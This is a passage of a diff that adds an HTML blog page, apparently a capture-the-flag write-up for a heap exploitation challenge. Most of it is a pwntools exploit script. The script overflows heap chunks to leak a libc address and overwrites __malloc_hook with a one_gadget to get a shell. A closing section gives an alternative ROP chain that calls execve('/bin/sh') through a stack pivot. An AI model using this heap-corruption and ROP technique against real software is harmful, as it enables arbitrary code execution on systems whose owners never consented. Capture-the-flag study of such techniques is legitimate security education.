+    io<span style="color:#f92672">.</span>sendline(f<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+    log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;Freed index: </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fill</span>(index, pay):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+    io<span style="color:#f92672">.</span>sendline(str(len(pay)))
+    io<span style="color:#f92672">.</span>sendline(pay)
+    log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;Filled index: </span><span style="color:#e6db74">{index}</span><span style="color:#e6db74">, with </span><span style="color:#e6db74">{pay}</span><span style="color:#e6db74">, (size </span><span style="color:#e6db74">{size}</span><span style="color:#e6db74">)&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(size):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(f<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{size}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+    log<span style="color:#f92672">.</span>info(f<span style="color:#e6db74">&#34;Allocated: </span><span style="color:#e6db74">{size}</span><span style="color:#e6db74"> bytes&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(index):
+    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Index:&#34;</span>)
+    io<span style="color:#f92672">.</span>sendline(str(index)<span style="color:#f92672">.</span>encode())
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>)
+    <span style="color:#66d9ef">return</span> data
+
+<span style="color:#75715e">#-----------Main function---------------#</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#75715e"># Leak #</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [0]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [1]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [2]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#index [3]</span>
+    alloc(<span style="color:#ae81ff">128</span>) <span style="color:#75715e">#unsorted [4]</span>
+    alloc(<span style="color:#ae81ff">30</span>) <span style="color:#75715e">#avoid coalescing [5]</span>
+
+    free(<span style="color:#ae81ff">1</span>); free(<span style="color:#ae81ff">2</span>)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#75715e">#[0]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#75715e">#[1 flag]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span> <span style="color:#75715e">#[1]</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>) <span style="color:#75715e">#[2 flag]</span>
+    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#[2 addr]</span>
+
+    fill(<span style="color:#ae81ff">0</span>, payload)
+
+    <span style="color:#75715e"># set unsorted bin to fastbin size</span>
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x31</span>)
+
+    fill(<span style="color:#ae81ff">3</span>, payload)
+
+    alloc(<span style="color:#ae81ff">30</span>)
+    alloc(<span style="color:#ae81ff">30</span>)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x91</span>)
+    fill(<span style="color:#ae81ff">3</span>, payload)
+
+    free(<span style="color:#ae81ff">4</span>)
+
+    leak <span style="color:#f92672">=</span> u64(dump(<span style="color:#ae81ff">2</span>)[:<span style="color:#ae81ff">8</span>])
+    libc_base <span style="color:#f92672">=</span> leak<span style="color:#f92672">-</span><span style="color:#ae81ff">0x39bb78</span>
+    print(<span style="color:#e6db74">&#34;Leak:&#34;</span>,hex(leak))
+    print(<span style="color:#e6db74">&#34;Base:&#34;</span>,hex(libc_base))
+
+    <span style="color:#75715e"># Shell #</span>
+
+    alloc(<span style="color:#ae81ff">104</span>) <span style="color:#75715e">#index [6]</span>
+    alloc(<span style="color:#ae81ff">104</span>) <span style="color:#75715e">#index [7]</span>
+    alloc(<span style="color:#ae81ff">104</span>) <span style="color:#75715e">#index [8]</span>
+    alloc(<span style="color:#ae81ff">104</span>) <span style="color:#75715e">#index [9]</span>
+
+    hook <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">3783440</span> <span style="color:#75715e">#__malloc_hook</span>
+    fake_fast <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">3783440</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x23</span> <span style="color:#75715e">#__malloc_hook</span>
+    one_gadg <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f42a</span> <span style="color:#75715e"># one_gadget libc</span>
+
+    print(<span style="color:#e6db74">&#34;Hook:&#34;</span>,hex(hook))
+    print(<span style="color:#e6db74">&#34;Fake_fast:&#34;</span>,hex(fake_fast))
+
+    free(<span style="color:#ae81ff">7</span>)
+    free(<span style="color:#ae81ff">8</span>)
+
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">13</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">104</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">13</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">104</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
+    payload <span style="color:#f92672">+=</span> p64(fake_fast) <span style="color:#75715e"># our fake chunk</span>
+    fill(<span style="color:#ae81ff">6</span>, payload)
+
+    alloc(<span style="color:#ae81ff">104</span>)
+    alloc(<span style="color:#ae81ff">104</span>)
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#75715e"># this was found manually</span>
+    payload <span style="color:#f92672">+=</span> p64(one_gadg)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+    fill(<span style="color:#ae81ff">8</span>, payload)
+
+
+    io<span style="color:#f92672">.</span>interactive()
+
+main()
+</code></pre></div><h1 id="no-one_gadget">No one_gadget?</h1>
+<p>We can stackpivot moving our stack to malloc hooks. Using pop rsp.
+Now that our stack is here, we&rsquo;ll want to get shell by calling execve binsh
+Reading from: <a href="https://filippo.io/linux-syscall-table/">https://filippo.io/linux-syscall-table/</a>
+we&rsquo;ll see that we need:</p>
+<pre><code>rsp = malloc+8
+rax = 59
+rdi = */bin/sh
+syscall
+</code></pre><p>The addresses are as follows:</p>
+<pre><code>0x0000000000003838 - pop rsp
+0x0000000000036218 - pop rax
+0x0000000000020e22 - pop rdi
+0x00000000000026bf - syscall
+</code></pre><p>To find the above i used ROPgadget libc | grep keyword.</p>
+<p>Now the final payload instead looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+payload <span style="color:#f92672">+=</span> p64(one_gadg)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3838</span>) <span style="color:#75715e"># pop rsp</span>
+payload <span style="color:#f92672">+=</span> p64(hook<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#75715e"># new top of stack</span>
+payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x36218</span>) <span style="color:#75715e"># pop rax</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">59</span>) <span style="color:#75715e"># rax</span>
+payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20e22</span>) <span style="color:#75715e"># pop rdi</span>
+payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x163c34</span>) <span style="color:#75715e">#*/bin/sh</span>
+payload <span style="color:#f92672">+=</span> p64(libc_base<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26bf</span>) <span style="color:#75715e"># syscall</span>
+</code></pre></div><p>Fin..</p>
+<p>happy days</p>
+
+</article>
+
+
+
+</html>
